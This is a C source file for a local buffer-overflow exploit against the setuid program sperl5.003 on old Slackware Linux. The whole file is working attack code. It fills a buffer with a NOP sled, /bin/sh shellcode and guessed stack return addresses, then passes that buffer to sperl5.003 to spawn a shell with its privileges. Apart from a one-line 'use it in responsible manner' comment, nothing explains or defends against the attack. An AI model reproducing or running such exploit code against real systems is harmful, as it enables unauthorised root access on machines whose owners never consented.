    /*    Linux sperl5.003 buffer overflow by ggajic@freenet.nether.net
                 based on Aleph1's buffer overflow code
                     use it in responsible manner
               tested on slackware 3.1 and slackware 3.2         */

    #include <stdlib.h>
    #define DEFAULT_OFFSET                  640
    #define DEFAULT_BUFFER_SIZE            1600
    #define NOP                            0x90

    char shellcode[] =
      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
      "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";

    unsigned long get_sp(void) {
       __asm__("movl %esp,%eax");
    }

    void main(int argc, char *argv[]) {
      char *buff, *ptr;
      long *addr_ptr, addr;
      int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
      int i;


      if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
      }

      addr = get_sp() - offset;
      printf("Using address: 0x%x\n", addr);

      ptr = buff;
      addr_ptr = (long *) ptr;
      for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

      for (i = 0; i < bsize/2; i++)
        buff[i] = NOP;

      ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
      for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

      buff[bsize - 1] = '\0';

      execl("/usr/bin/sperl5.003","/usr/sbin/sperl5.003",buff, NULL);
    }

